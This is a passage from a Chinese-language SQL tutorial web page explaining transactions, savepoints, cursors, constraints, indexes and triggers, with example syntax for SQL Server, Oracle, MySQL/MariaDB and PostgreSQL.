<span class="token keyword">SELECT</span> <span class="token variable">@order_num</span><span class="token operator">=</span><span class="token function">MAX</span><span class="token punctuation">(</span>order_num<span class="token punctuation">)</span>
<span class="token keyword">FROM</span> Orders
<span class="token comment">-- Determine next order number</span>
<span class="token keyword">SELECT</span> <span class="token variable">@order_num</span><span class="token operator">=</span><span class="token variable">@order_num</span><span class="token operator">+</span><span class="token number">1</span>
<span class="token comment">-- Insert new order</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Orders<span class="token punctuation">(</span>order_num<span class="token punctuation">,</span> order_date<span class="token punctuation">,</span> cust_id<span class="token punctuation">)</span>
<span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token variable">@order_num</span><span class="token punctuation">,</span> GETDATE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">@cust_id</span><span class="token punctuation">)</span>
<span class="token comment">-- Return order number</span>
<span class="token keyword">RETURN</span> <span class="token variable">@order_num</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>说明：<strong>注释代码</strong><br>对代码注释的标准方式是在之前放置两个连字符–。有的 DBMS 支持其他注释语法，不过所有 DBMS 都支持–，因此在注释代码时最好使用这种语法。</p>
</blockquote>
<h2 id="管理事务处理"><a href="#管理事务处理" class="headerlink" title="管理事务处理"></a>管理事务处理</h2><p>使用事务处理（transaction processing），通过确保成批的 SQL 操作要么完全执行，要么完全不执行，来维护数据库的完整性。</p>
<p>事务处理是一种机制，用来管理必须成批执行的 SQL 操作，保证数据库不包含不完整的操作结果。利用事务处理，可以保证一组操作不会中途停止，它们要么完全执行，要么完全不执行（除非明确指示）。如果没有错误发生，整组语句提交给（写到）数据库表；如果发生错误，则进行回退（撤销），将数据库恢复到某个已知且安全的状态。</p>
<p>事务处理需要知道的几个术语：</p>
<ul>
<li><p>事务（transaction）指一组 SQL 语句</p>
</li>
<li><p>回退（rollback）指撤销指定 SQL 语句的过程</p>
</li>
<li><p>提交（commit）指将未存储的 SQL 语句结果写入数据库表</p>
</li>
<li><p>保留点（savepoint）指事务处理中设置的临时占位符（placeholder），可以对它发布回退（与回退整个事务处理不同）</p>
</li>
</ul>
<blockquote>
<p>提示：<strong>可以回退哪些语句？</strong><br>事务处理用来管理 INSERT、UPDATE 和 DELETE 语句。不能回退 SELECT 语句（回退 SELECT 语句也没有必要），也不能回退 CREATE 或 DROP 操作。事务处理中可以使用这些语句，但进行回退时，这些操作也不撤销。</p>
</blockquote>
<h3 id="控制事务处理"><a href="#控制事务处理" class="headerlink" title="控制事务处理"></a>控制事务处理</h3><p>不同 DBMS 用来实现事务处理的语法有所不同。</p>
<p>管理事务的关键在于将 SQL 语句组分解为逻辑块，并明确规定数据何时应该回退，何时不应该回退。</p>
<p>有的 DBMS 要求明确标识事务处理块的开始和结束。如在 SQL Server 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span> <span class="token keyword">TRANSACTION</span>
<span class="token comment">-- 事务内的SQL语句</span>
<span class="token keyword">COMMIT</span> <span class="token keyword">TRANSACTION</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>MariaDB 和 MySQL 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">START</span> <span class="token keyword">TRANSACTION</span>
<span class="token comment">-- 事务内的SQL语句</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Oracle 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">TRANSACTION</span>
<span class="token comment">-- 事务内的SQL语句</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>PostgreSQL 使用 ANSI SQL 语法：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span>
<span class="token comment">-- 事务内的SQL语句</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>多数 DBMS 实现没有明确标识事务处理在何处结束。事务一直存在，直到被中断。通常 COMMIT 用于保存更改，ROLLBACK 用于撤销。</p>
<h4 id="使用-ROLLBACK"><a href="#使用-ROLLBACK" class="headerlink" title="使用 ROLLBACK"></a>使用 ROLLBACK</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span>
<span class="token keyword">ROLLBACK</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="使用-COMMIT"><a href="#使用-COMMIT" class="headerlink" title="使用 COMMIT"></a>使用 COMMIT</h4><p>一般的 SQL 语句都是针对数据库表直接执行和编写的。这就是所谓的隐式提交（implicit commit），即提交（写或保存）操作是自动进行的。</p>
<p>在事务处理块中，提交不会隐式进行。不过，不同 DBMS 的做法有所不同。有的 DBMS 按隐式提交处理事务端，有的则不这样。</p>
<p>进行明确提交使用 COMMIT 语句。</p>
<p>在 SQL Server 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span> <span class="token keyword">TRANSACTION</span>
<span class="token keyword">DELETE</span> table2 <span class="token keyword">WHERE</span> column1_2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">DELETE</span> table1 <span class="token keyword">WHERE</span> column1_2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">COMMIT</span> <span class="token keyword">TRANSACTION</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 Oracle 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">TRANSACTION</span>
<span class="token keyword">DELETE</span> table2 <span class="token keyword">WHERE</span> column1_2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">DELETE</span> table1 <span class="token keyword">WHERE</span> column1_2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">COMMIT</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="使用保留点"><a href="#使用保留点" class="headerlink" title="使用保留点"></a>使用保留点</h4><p>使用简单的 ROLLBACK 和 COMMIT 语句，可以写入或撤销整个事务。但是只对简单的事务才能这样做，复杂的事务可能需要部分提交或回退。</p>
<p>要支持回退部分事务，必须在事务处理块中的合适位置放置占位符。如果需要回退，可以回退到某个占位符。</p>
<p>在 SQL 中，这些占位符称为保留点。在 MariaDB、MySQL 和 Oracle 中创建占位符，可使用 SAVEPOINT 语句。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SAVEPOINT</span> delete1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 SQL Server 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SAVE</span> <span class="token keyword">TRANSACTION</span> delete1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>每个保留点都要取能够标识它的唯一名字，以便在回退时，DBMS 知道回退到何处。</p>
<p>在 SQL Server 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span> delete1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 MariaDB、MySQL、Oracle 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ROLLBACK</span> <span class="token keyword">TO</span> delete1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下面是一个完整的 SQL Server 例子：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span> <span class="token keyword">TRANSACTION</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table1<span class="token punctuation">(</span>column1_2<span class="token punctuation">,</span> column2<span class="token punctuation">)</span>
<span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SAVE</span> <span class="token keyword">TRANSACTION</span> StartTable1<span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table2<span class="token punctuation">(</span>column2_3<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column1_2<span class="token punctuation">)</span>
<span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'001'</span><span class="token punctuation">,</span> <span class="token string">'2020/1/31'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">IF</span> @<span class="token variable">@ERROR</span> <span class="token operator">&lt;></span> <span class="token number">0</span> <span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span> StartTable1<span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table3<span class="token punctuation">(</span>column2_3<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> column4<span class="token punctuation">)</span>
<span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'001'</span><span class="token punctuation">,</span> <span class="token string">'BR01'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">5.49</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">IF</span> @<span class="token variable">@ERROR</span> <span class="token operator">&lt;></span> <span class="token number">0</span> <span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span> StartTable1<span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table3<span class="token punctuation">(</span>column2_3<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> column4<span class="token punctuation">)</span>
<span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'001'</span><span class="token punctuation">,</span> <span class="token string">'BR02'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">10.99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">IF</span> @<span class="token variable">@ERROR</span> <span class="token operator">&lt;></span> <span class="token number">0</span> <span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span> StartTable1<span class="token punctuation">;</span>
<span class="token keyword">COMMIT</span> <span class="token keyword">TRANSACTION</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>@@ERROR 变量返回一个非 0 值，表示有错误发生，事务处理回退到保留点。如果整个事务处理成功，发布 COMMIT 保留数据。</p>
<p>可以在 SQL 中设置任意多的保留点，保留点越多越好，这样能够灵活地进行回退。</p>
<h2 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h2><p>SQL 检索操作返回的所有行称为结果集，结果集都是与 SQL 语句相匹配的行（零行或多行）。简单地使用 SELECT 语句，没有办法得到第一行、下一行或前十行。</p>
<p>游标（cursor）是一个存储在 DBMS 服务器上的数据库查询，它不是一条 SELECT 语句，而是被该语句检索出来的结果集。在存储了游标之后，应用程序可以根据需要滚动或浏览其中的数据。</p>
<p>不同的 DBMS 支持不同的游标选项和特性。常见的一些选项和特性如下：</p>
<ul>
<li><p>能够标记游标为只读，使数据能读取，但不能更新和删除</p>
</li>
<li><p>能控制可以执行的定向操作（向前、向后、第一、最后、绝对位置、相对位置等）</p>
</li>
<li><p>能标记某些列为可编辑的，某些列为不可编辑的</p>
</li>
<li><p>规定范围，使游标对创建它的特定请求（如存储过程）或所有请求可访问</p>
</li>
<li><p>指示 DBMS 对检索出的数据（而不是指出表中活动数据）进行复制，使数据在游标打开和访问期间不变化</p>
</li>
</ul>
<blockquote>
<p>说明：<strong>具体 DBMS 的支持</strong><br>Access 不支持游标，MySQL5 以下不支持游标，SQLite 支持的游标称为步骤（step），这里讲述的基本概念适用于 SQLite 的步骤，但语法可能完全不同。</p>
</blockquote>
<p>游标主要用于交互式应用，其中用户需要滚动屏幕上的数据，并对数据进行浏览或做出更改。</p>
<blockquote>
<p>说明：<strong>游标与基于 web 的应用</strong><br>游标对基于 web 的应用用处不大。虽然游标在客户端应用和服务器会话期间存在，但这种客户/服务器模式不适合 web 应用，因为应用服务器是数据库客户端而不是最终用户。所以，大多数 web 应用开发人员不使用游标，他们根据自己需要重新开发相应功能</p>
</blockquote>
<p>使用游标涉及几个明确的步骤：</p>
<ol>
<li><p>在使用游标前，必须声明它。这个过程实际上没有检索数据，它只是定义要使用的 SELECT 语句和游标选项</p>
</li>
<li><p>一旦声明，就必须打开游标以供使用。这个过程用前面定义的 SELECT 语句把数据实际检索出来</p>
</li>
<li><p>对于填有数据的游标，根据需要取出各行</p>
</li>
<li><p>在结束游标使用时，必须关闭游标，可能的话，释放游标（依赖于具体的 DBMS）</p>
</li>
</ol>
<p>声明游标后，可根据需要频繁地打开和关闭游标。在游标打开时，可根据需要频繁地执行取操作。</p>
<h3 id="创建游标"><a href="#创建游标" class="headerlink" title="创建游标"></a>创建游标</h3><p>使用 DECLARE 语句创建游标，这条语句在不同的 DBMS 中有所不同。</p>
<p>在 DB2、MariaDB、MySQL 和 SQL Server 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> cusor1 <span class="token keyword">CURSOR</span> <span class="token keyword">FOR</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在 Oracle 和 PostgreSQL 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token keyword">CURSOR</span> cursor1 <span class="token operator">IS</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="使用游标"><a href="#使用游标" class="headerlink" title="使用游标"></a>使用游标</h3><p>使用 OPEN CURSOR 语句打开游标，大多数 DBMS 中语法相同：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">OPEN</span> <span class="token keyword">CURSOR</span> cursor1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在处理 OPEN CURSOR 语句时执行查询，存储检索出的数据以供浏览和滚动。</p>
<p>现在可以用 FETCH 语句访问游标数据了。FETCH 指出要检索哪些行，从何处检索它们以及将它们放于何处（如变量名）。</p>
<p>在 Oracle 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token keyword">TYPE</span> cursor1 <span class="token operator">IS</span> REF <span class="token keyword">CURSOR</span>
  <span class="token keyword">RETURN</span> table1<span class="token operator">%</span>ROWTYPE<span class="token punctuation">;</span>
<span class="token keyword">DECLARE</span> record1 table1<span class="token operator">%</span>ROWTYPE
<span class="token keyword">BEGIN</span>
  <span class="token keyword">OPEN</span> cursor1<span class="token punctuation">;</span>
  <span class="token keyword">FETCH</span> cursor1 <span class="token keyword">INTO</span> record1<span class="token punctuation">;</span>
  <span class="token keyword">CLOSE</span> cursor1<span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本例中，FETCH 用来检索当前行（自动从第一行开始），放到声明的变量 record1 中。对检索出的数据不做任何处理。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token keyword">TYPE</span> cursor1 <span class="token operator">IS</span> REF <span class="token keyword">CURSOR</span>
  <span class="token keyword">RETURN</span> table1<span class="token operator">%</span>ROWTYPE<span class="token punctuation">;</span>
<span class="token keyword">DECLARE</span> record1 table1<span class="token operator">%</span>ROWTYPE
<span class="token keyword">BEGIN</span>
  <span class="token keyword">OPEN</span> cursor1<span class="token punctuation">;</span>
  <span class="token keyword">LOOP</span>
  <span class="token keyword">FETCH</span> cursor1 <span class="token keyword">INTO</span> record1<span class="token punctuation">;</span>
  <span class="token keyword">EXIT</span> <span class="token keyword">WHEN</span> cursor1<span class="token operator">%</span>NOTFOUND<span class="token punctuation">;</span>
  <span class="token keyword">END</span> <span class="token keyword">LOOP</span><span class="token punctuation">;</span>
  <span class="token keyword">CLOSE</span> cursor1<span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本例对检索出的数据进行循环。</p>
<h3 id="关闭游标"><a href="#关闭游标" class="headerlink" title="关闭游标"></a>关闭游标</h3><p>游标在使用完毕时需要关闭，此外，SQL Server 等 DBMS 要求明确释放游标所占用的资源。</p>
<p>在 DB2、Oracle、PostgreSQL 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CLOSE</span> cursor1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 SQL Server 中：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CLOSE</span> cursor1<span class="token punctuation">;</span>
<span class="token keyword">DEALLOCATE</span> <span class="token keyword">CURSOR</span> cursor1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>CLOSE 语句用来关闭游标。一旦游标关闭，如果不再次打开，将不能使用。第二次使用它时不需要再声明，只需要使用 OPEN 再次打开它。</p>
<h2 id="高级-SQL-特性"><a href="#高级-SQL-特性" class="headerlink" title="高级 SQL 特性"></a>高级 SQL 特性</h2><h3 id="约束（constraint）"><a href="#约束（constraint）" class="headerlink" title="约束（constraint）"></a>约束（constraint）</h3><p>约束是指管理如何插入或处理数据库数据的规则。</p>
<p>为什么不在客户端层面实施数据库完整性规则？</p>
<ol>
<li><p>若在客户端层面实施数据库完整性规则，则每个客户端都要实施</p>
</li>
<li><p>执行 UPDATE 和 DELETE 操作时也必须实施这些规则</p>
</li>
<li><p>执行客户端检查非常耗时，而 DBMS 更高效</p>
</li>
</ol>
<p>DBMS 通过在数据库表上施加约束来实施引用完整性。大多数约束是在表定义中定义的，即在使用 CREATE TABLE 或 ALTER TABLE 语句时。</p>
<h4 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h4><p>主键是一种特殊约束，用来保证一列（或一组列）中的值是唯一的，且永不改动。没有主键，要安全地 UPDATE 或 DELETE 特定行而不影响其他行会非常困难。</p>
<p>主键的条件：</p>
<ul>
<li><p>任意两行的主键值都不相同</p>
</li>
<li><p>每行都具有一个主键值（即列中不允许有 NULL 值）</p>
</li>
<li><p>包含主键的列从不修改或更新（大多数 DBMS 不允许这样做）</p>
</li>
<li><p>主键值不能重用。如果从表中删除某行，其主键值不分配给新行</p>
</li>
</ul>
<p>主键使用 PRIMARY KEY 关键字</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建表时</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table1<span class="token punctuation">(</span>
  column1 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>
  column2 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token boolean">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 修改表时</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> table1 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>column1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>说明：<strong>SQLite 中的键</strong><br>SQLite 不允许使用 ALTER TABLE 定义键，要求在初始的 CREATE TABLE 语句中定义它。</p>
</blockquote>
<h4 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h4><p>外键是表中的一列，其值必须是另一个表的主键列值。外键是保证引用完整性的极其重要部分。</p>
<p>外键使用 REFERENCES 关键字</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建表时</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table1 <span class="token punctuation">(</span>
  column1 <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>
  column2 <span class="token keyword">DATETIME</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  column3 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">REFERENCES</span> table2<span class="token punctuation">(</span>column1<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 修改表时</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> table1 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>column3<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> table2 <span class="token punctuation">(</span>column1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>外键有助于防止意外删除</strong><br>在定义外键后，DBMS 不允许删除在另一个表中具有关联行的行。有的 DBMS 支持级联删除（cascading delete）的特性。如果启用，该特性在从一个表中删除行时删除所有相关的数据。</p>
</blockquote>
<h4 id="唯一约束"><a href="#唯一约束" class="headerlink" title="唯一约束"></a>唯一约束</h4><p>唯一约束用来保证一列（或一组列）中的数据是唯一的。它们类似于主键，但存在以下重要区别：</p>
<ul>
<li><p>表可以包含多个唯一约束，但每个表只允许一个主键</p>
</li>
<li><p>唯一约束可以包含 NULL 值</p>
</li>
<li><p>唯一约束可以修改或更新</p>
</li>
<li><p>唯一约束列的值可重复使用</p>
</li>
<li><p>与主键不一样，唯一约束不能用来定义外键</p>
</li>
</ul>
<p>唯一约束既可以用 UNIQUE 关键字在表定义中定义，也可以用单独的 CONSTRAINT 定义。</p>
<h4 id="检查约束"><a href="#检查约束" class="headerlink" title="检查约束"></a>检查约束</h4><p>检查约束用来保证一列（或一组列）中的数据满足一组指定的条件。检查约束的常见用途有：</p>
<ul>
<li><p>检查最小或最大值</p>
</li>
<li><p>指定范围</p>
</li>
<li><p>只允许特定值</p>
</li>
</ul>
<p>数据类型限制了列中可保存的数据类型。检查约束在数据类型内又做了进一步的限制，不需要依赖于客户端应用程序或用户来保证正确获取它，DBMS 本身将拒绝任何无效的数据。</p>
<p>检查约束使用 CHECK 关键字</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建表时</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table1 <span class="token punctuation">(</span>
  column1 <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  column2 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">CHECK</span> <span class="token punctuation">(</span>column2 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 修改表时</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> table1 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> <span class="token keyword">CHECK</span> <span class="token punctuation">(</span>column2 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>用户定义数据类型</strong><br>有的 DBMS 允许用户定义自己的数据类型。定制数据类型的优点是只需施加一次约束（在数据类型定义中），而每当使用该数据类型时，都会自动应用这些约束。</p>
</blockquote>
<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>索引用来排序数据以加快搜索和排序操作的速度。</p>
<p>主键数据总是排序的，按主键检索特定行总是一种快速有效的操作。但是，搜索其他列中的值通常效率不高，解决方法是使用索引。可以在一个或多个列上定义索引，使 DBMS 保存其内容的一个排序列表。DBMS 搜索排过序的索引，找出匹配的位置，然后检索这些行。</p>
<p>创建索引的注意事项：</p>
<ul>
<li><p>索引改善检索操作的性能，但降低了数据插入、修改和删除的性能。在执行这些操作时，DBMS 必须动态地更新索引</p>
</li>
<li><p>索引数据可能要占用大量的存储空间</p>
</li>
<li><p>并非所有数据都适合做索引。取值不多的数据不如具有更多可能值的数据，能通过索引得到那么多的好处</p>
</li>
<li><p>索引用于数据过滤和数据排序。若你经常以某种特定的顺序排序数据，则该数据可能适合做索引</p>
</li>
<li><p>可以在索引中定义多个列</p>
</li>
</ul>
<p>大多数 DBMS 提供了可以用来确定索引效率的实用程序，应该经常使用这些实用程序。</p>
<p>索引用 CREATE INDEX 语句创建（不同的 DBMS 创建索引的语句变化很大），索引必须唯一命名。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> column1_index <span class="token keyword">ON</span> table1 <span class="token punctuation">(</span>column1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>检查索引</strong><br>索引的效率随表数据的增加或改变而变化。过去创建的某个理想的索引经过几个月的数据处理后可能变得不再理想了。最好定期检查索引，并根据需要对索引进行调整。</p>
</blockquote>
<h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3><p>触发器是特殊的存储过程，它在特定的数据库活动发生时自动执行。触发器可以与特定表上的 INSERT、UPDATE 和 DELETE 操作（或组合）相关联。</p>
<p>与存储过程不一样。存储过程只是简单的 SQL 存储 SQL 语句，触发器与单个表相关联。</p>
<p>触发器内的代码具有以下数据的访问权：</p>
<ul>
<li><p>INSERT 操作中的所有新数据</p>
</li>
<li><p>UPDATE 操作中的所有新数据和旧数据</p>
</li>
<li><p>DELETE 操作中删除的数据</p>
</li>
</ul>
<p>根据 DBMS 不同，触发器可在特定操作执行之前或之后执行</p>
<p>触发器常见用途：</p>
<ul>
<li><p>保证数据一致。如在 INSERT 或 UPDATE 操作中转换数据格式</p>
</li>
<li><p>基于某个表的变动在其他表上执行活动</p>
</li>
<li><p>进行额外的验证并根据需要回退数据</p>
</li>
<li><p>计算计算列的值或更新时间戳</p>
</li>
</ul>
<p>不同 DBMS 触发器语法差异很大</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- SQL Server</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> column1
<span class="token keyword">ON</span> table1
<span class="token keyword">FOR</span> <span class="token keyword">INSERT</span><span class="token punctuation">,</span> <span class="token keyword">UPDATE</span>
<span class="token keyword">AS</span>
<span class="token keyword">UPDATE</span> table1
<span class="token keyword">SET</span> column1 <span class="token operator">=</span> Upper<span class="token punctuation">(</span>column1<span class="token punctuation">)</span>
<span class="token keyword">WHERE</span> table1<span class="token punctuation">.</span>column1 <span class="token operator">=</span> inserted<span class="token punctuation">.</span>column1<span class="token punctuation">;</span>
<span class="token comment">-- Oracle、PostgreSQL</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> column1
<span class="token keyword">AFTER</span> <span class="token keyword">INSERT</span> <span class="token operator">OR</span> <span class="token keyword">UPDATE</span>
<span class="token keyword">FOR EACH ROW</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">UPDATE</span> table1
<span class="token keyword">SET</span> column1 <span class="token operator">=</span> Upper<span class="token punctuation">(</span>column1<span class="token punctuation">)</span>
<span class="token keyword">WHERE</span> table1<span class="token punctuation">.</span>column1 <span class="token operator">=</span> :OLD<span class="token punctuation">.</span>column1
